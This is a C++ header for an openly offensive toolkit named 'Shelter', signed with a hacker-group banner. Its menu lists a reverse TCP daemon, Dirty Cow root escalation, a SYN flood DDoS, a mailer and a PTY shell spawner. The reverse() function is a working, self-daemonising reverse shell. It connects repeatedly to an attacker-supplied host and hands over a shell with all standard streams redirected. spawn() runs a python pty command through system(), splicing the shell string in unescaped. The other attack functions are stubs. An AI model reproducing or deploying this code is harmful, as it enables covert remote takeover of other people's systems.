#ifndef SHELTER_HPP
#define SHELTER_HPP

#include <iostream>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <string>
#include <vector>

using std::string;
using std::vector;
using std::cout;
using std::cerr;
using std::endl;


class Shelter {
    public:
        bool verbose = false;

        void showBanner()
        {
            cout << R"(
                              __
                     /\    .-" /
                    /  ; .'  .' 
                   :   :/  .'   
                    \  ;-.'     
       .--""""--..__/     `.    
     .'           .'    `o  \   
    /                    `   ;  
   :                  \      :  
 .-;        -.         `.__.-'  
:  ;          \     ,   ;       
'._:           ;   :   (        
    \/  .__    ;    \   `-.     
     ;     "-,/_..--"`-..__)    
     '""--.._:
<Cvar1984@BHSec>

)";
        }

        void showHelp()
        {
            vector<vector<string>> list = {
                { // desc
                    "Reverse TCP (Daemon)",
                    "Gain ROOT (Dirty Cow)",
                    "SMTP Mailer",
                    "SYNC Flood (DDOS)",
                    "Spawn PTY Shell",
                    "Verbose Informations"
                },
                { // flag
                    "--reverse",
                    "--root",
                    "--mail",
                    "--ddos",
                    "--spawn",
                    "--verbose"
                },
                { // arg
                    "-h host -p port -s shell",
                    "NONE",
                    "-f from -t to -b body",
                    "-h host -p port -s size",
                    "-s shell",
                    "NONE"
                }
            };

            cout << "Usage: [options] [args]" << endl;
            for(int x = 0; x < (int)list[0].size(); x++) {
                cout << endl << list[0][x] << endl;
                cout << "\t" << list[1][x] << endl;
                cout << "\t" << list[2][x] << endl;

            }
        }

        void reverse(string host, unsigned short port, string shell) { 
            if(this->verbose) {
                cout << host << ":" << port << " << " << shell << endl;
            }

            struct sockaddr_in sa;
            int s;
            pid_t pid, sid;
            pid = fork(); // fork process

            if(pid > 0) exit(EXIT_SUCCESS);
            else if(pid < 0) exit(EXIT_FAILURE);
            umask(0);
            sid = setsid(); // generate session id for child
            if(sid < 0) exit(EXIT_FAILURE);

            close(STDIN_FILENO);
            close(STDOUT_FILENO);
            close(STDERR_FILENO);

            while(1)
            {
                /** do a magic
                */
                sa.sin_family = AF_INET;
                sa.sin_addr.s_addr = inet_addr(host.c_str());
                sa.sin_port = htons(port);
                s = socket(AF_INET, SOCK_STREAM, 0);
                connect(s, (struct sockaddr *)&sa, sizeof(sa));
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);
                execve(shell.c_str(), 0, 0);
                sleep(5);
            }
            exit(EXIT_SUCCESS);
        }

        void dirtyCow()
        {
            cout << "Not available yet" << endl;
        }
        void ddos()
        {
            cout << "Not available yet" << endl;
        }
        void mail()
        {
            cout << "Not available yet" << endl;
        }
        void spawn(string shell)
        {
            string shl = "python -c 'import pty;pty.spawn(\"";
            shl.append(shell);
            shl.append("\");'");
            system(shl.c_str());
            if(this->verbose) cout << "spawning " << shl << endl;
        }
};
#endif
